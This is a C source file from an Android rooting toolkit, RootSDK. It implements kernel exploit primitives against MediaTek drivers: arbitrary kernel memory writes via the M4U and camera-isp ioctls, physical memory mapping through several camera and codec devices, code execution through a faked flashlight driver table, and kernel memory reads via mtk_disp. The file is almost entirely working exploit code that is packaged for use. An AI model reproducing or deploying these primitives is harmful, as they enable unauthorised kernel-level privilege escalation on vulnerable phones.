/*****************************************************************************
 * Copyright (C) 2013-2014 Ming Hu tewilove<at>gmail.com
 *
 * This file is part of RootSDK.
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation; either version 2.1 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston MA 02110-1301, USA.
 *****************************************************************************/


#include "log.h"
#include "exploit.h"
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>

#define MTK_M4U_MAGICNO 'g'
#define MTK_M4U_T_REG_SET             _IOW(MTK_M4U_MAGICNO, 24, int)

struct m4u_t_reg_set {
    unsigned int addr;
    unsigned int val;
};

static int mtk_M4U_init(void **opaque) {
    int fd;

    *opaque = (void *) -1;
    fd = open("/dev/M4U_device", O_RDONLY);
    if (fd < 0) {
        //LOGE("open()");
        return -1;
    }
    *opaque = (void *) fd;
    return 0;
}

static void mtk_M4U_free(void **opaque) {
    if ((int)(*opaque) >= 0)
        close((int)(*opaque));
    *opaque = (void *) -1;
}

static int mtk_M4U_write32(void *opaque, long addr, long val) {
    int rc, fd = (int) opaque;
    struct m4u_t_reg_set payload;

    payload.addr = addr;
    payload.val = val;
    rc = ioctl(fd, MTK_M4U_T_REG_SET, &payload);
    if (rc < 0)
        LOGE("ioctl()");
    return rc;
}

exploit_t EXPLOIT_mtk_M4U = {
    .name = "MTK M4U_device",
    .flags = EXPLOIT_POKE_TEXT,
    .init = mtk_M4U_init,
    .free = mtk_M4U_free,
    .write32 = mtk_M4U_write32,
};

struct private_data_mmap {
    int fd;
    void *mapped;
    int size;
    int index;
};

static int mtk_mmap_init(void **opaque) {
    struct private_data_mmap *p;

    *opaque = malloc(sizeof(struct private_data_mmap));
    if (!*opaque)
        return -1;
    p = (struct private_data_mmap *)(*opaque);
    p->fd = -1;
    p->mapped = MAP_FAILED;
    p->size = 0;
    p->index = 0;
    return 0;
}

static void *mtk_mmap_mmap(void *opaque, long addr, long size) {
    struct private_data_mmap *p = (struct private_data_mmap *) opaque;
    const char *devices[] = {
        "/dev/camera-sysram",
        "/dev/camera-isp",
        "/dev/mt6573-SYSRAM",
        "/dev/mt6573-MDP",
        "/dev/mt6575-SYSRAM",
        "/dev/mt6575-isp",
        "/dev/mt6575-MDP",
        "/dev/mt6575-eis",
        "/dev/camera-eis",
        "/dev/Vcodec",
        0
    };
    int rc, fd, i;

    p->mapped = MAP_FAILED;
    p->size = 0;
    for (i = p->index; devices[i]; i++) {
        fd = open(devices[i], O_RDWR);
        if (fd < 0) {
            // LOGE("open()");
            continue;
        }
        rc = exploit_generic_mmap(fd, addr, size, &p->mapped);
        if (!rc) {
            p->index = i + 1;
            p->size = size;
            return p->mapped;
        }
        close(fd);
    }
    return MAP_FAILED;
}

static void mtk_mmap_free(void **opaque) {
    struct private_data_mmap *p = (struct private_data_mmap *)(*opaque);

    if (p->mapped && p->mapped != MAP_FAILED) {
        munmap(p->mapped, p->size);
    }
    if (p->fd >= 0)
        close(p->fd);
    free(p);
}

exploit_t EXPLOIT_mtk_mmap = {
    .name = "MTK mmap",
    .init = mtk_mmap_init,
    .free = mtk_mmap_free,
    .mmap = mtk_mmap_mmap,
};

#define ISP_ADDR_CAMINF 0xF5000000

typedef struct
{
    unsigned int Addr;   // register's addr
    unsigned int Val;    // register's value
}ISP_REG_STRUCT;

typedef struct
{
    unsigned int Data;   // pointer to ISP_REG_STRUCT
    unsigned int Count;  // count
}ISP_REG_IO_STRUCT;

#define ISP_CMD_WRITE_REG   3
#define ISP_MAGIC           'k'
#define ISP_WRITE_REGISTER  _IOWR(ISP_MAGIC, ISP_CMD_WRITE_REG, ISP_REG_IO_STRUCT)

static int mtk_camera_isp_init(void **opaque) {
    int fd;

    *opaque = (void *)(-1);
    fd = open("/dev/camera-isp", O_RDWR);
    if (fd < 0) {
        // LOGE("open");
        return -1;
    }
    *opaque = (void *) fd;
    return 0;
}

static void mtk_camera_isp_free(void **opaque) {
    int fd;

    fd = (int)(*opaque);
    if (fd >= 0)
        close(fd);
    *opaque = (void *) -1;
}

static int mtk_camera_isp_write32(void *opaque, long addr, long val) {
    int rc;
    ISP_REG_STRUCT info;
    ISP_REG_IO_STRUCT args;

    info.Addr = (unsigned int) addr - ISP_ADDR_CAMINF;
    info.Val = (unsigned int) val;
    args.Data = (unsigned int) &info;
    args.Count = 1;

    rc = ioctl((int) opaque, ISP_WRITE_REGISTER, &args);
    if (rc < 0) {
        LOGE("ioctl()");
        return -1;
    }
    // XXX: wtf
    // usleep(1000 * 1000);
    return 0;
}

exploit_t EXPLOIT_mtk_camera_isp = {
    .name = "MTK camera_isp",
    .flags = EXPLOIT_POKE_TEXT,
    .init = mtk_camera_isp_init,
    .free = mtk_camera_isp_free,
    .write32 = mtk_camera_isp_write32,
};

#define FLASHLIGHT_MAGIC 'S'
#define FLASHLIGHTIOC_X_SET_DRIVER _IOWR(FLASHLIGHT_MAGIC,30,unsigned long)

// XXX: why mmap ANONYMOUS | FIXED | SHARED not working???
// kernel is about server MB
static long fl_fake_init[16 * 1024 * 1024 / sizeof(long)];

static int mtk_camera_fl_init(void **opaque) {
    int fd;

    *opaque = (void *) -1;
    fd = open("/dev/kd_camera_flashlight", O_RDWR);
    if (fd < 0)
        return -1;
    *opaque = (void *) fd;
    return 0;
}

static int mtk_camera_fl_invoke(void *opaque, long addr) {
    int rc, fd, i, idx;

    fd = (int) opaque;
    for (i = 0; i < sizeof(fl_fake_init) / sizeof(fl_fake_init[0]); i++)
        fl_fake_init[i] = addr;
    // assume kernel is at 0xc0000000
    idx = (0x40000000 + (unsigned int) &fl_fake_init[0]) >> 3;
    rc = ioctl(fd, FLASHLIGHTIOC_X_SET_DRIVER, idx);
    return rc;
}

static void mtk_camera_fl_free(void **opaque) {
    if ((int)(*opaque) >= 0)
        close((int)(*opaque));
    *opaque = (void *) -1;
}

exploit_t EXPLOIT_mtk_camera_fl = {
    .name = "MTK kd_camera_flashlight",
    .init = mtk_camera_fl_init,
    .invoke = mtk_camera_fl_invoke,
    .free = mtk_camera_fl_free,
};

#define DISP_IOCTL_MAGIC        'x'
#define DISP_IOCTL_READ_REG        _IOWR    (DISP_IOCTL_MAGIC, 2, DISP_READ_REG)

typedef struct {
    unsigned int reg;
    unsigned int *val;
    unsigned int mask;
} DISP_READ_REG;

static int mtk_disp_init(void **opaque) {
    int fd;

    *opaque = (void *) -1;
    fd = open("/dev/mtk_disp", O_RDONLY);
    if (fd < 0)
        return -1;
    *opaque = (void *) fd;
    return 0;
}

static int mtk_disp_read32(void *opaque, long addr, long *val) {
    int rc, fd;
    DISP_READ_REG args;
    unsigned int tmp = 0;

    fd = (int) opaque;
    args.reg = addr;
    args.val = &tmp;
    args.mask = (unsigned int) -1;
    rc = ioctl(fd, DISP_IOCTL_READ_REG, &args);
    if (rc < 0)
        return rc;
    *val = (long) tmp;
    return 0;
}

static void mtk_disp_free(void **opaque) {
    int fd;

    fd = (int)(*opaque);
    if (fd >= 0)
        close(fd);
    *opaque = (void *) 0;
}

exploit_t EXPLOIT_mtk_disp = {
    .name = "MTK mtk_disp",
    .init = mtk_disp_init,
    .free = mtk_disp_free,
    .read32 = mtk_disp_read32,
};
